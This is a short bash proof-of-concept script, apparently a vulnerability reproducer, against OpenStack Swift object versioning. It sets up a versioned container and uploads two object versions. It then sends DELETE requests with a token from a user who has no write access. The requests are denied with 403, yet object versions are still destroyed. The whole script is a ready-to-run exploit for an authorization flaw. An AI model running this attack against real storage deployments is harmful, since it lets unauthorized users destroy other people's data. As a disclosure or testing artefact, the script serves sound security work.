#!/bin/bash
resetswift
swift-init start main
# create a container with read access (in this case public, but any listing
# access would do)
swift post target -r '.r:*, .rlistings'
# create a versioned container that uses the target to store versions
swift post source -H 'x-versions-location: target'
# upload an object, then overwrite so a version is created
for i in {1..2}; do
  echo "test${i}" > test
  swift upload source test
done
# current version is the 2, there's one object in the version location
echo ===========================================
echo $(swift list target | wc -l) version exists
echo current version is $(swift download source test -o -)
echo ===========================================
# the attack url is the test object we uploaded
ATTACK_URL=$(swift stat -v source test | grep URL | awk '{print $2}')
echo ATTACK_URL=$ATTACK_URL
# the attacker token has *no write access* to any containers in our account
ATTACK_TOKEN=$(swift stat -v -U 'test2:tester2' -K testing2 | \
  grep 'Auth Token' | awk '{print $3}')
echo ATTACK_TOKEN=$ATTACK_TOKEN
# issue some delete requests to container - note the 403 response
for i in {1..2}; do
  curl $ATTACK_URL -H "x-auth-token: $ATTACK_TOKEN" -XDELETE
  echo
done
# but the damage is done
echo ================================================
echo $(swift list target | wc -l) version exists
echo current version is $(swift download source test -o -)
echo ================================================
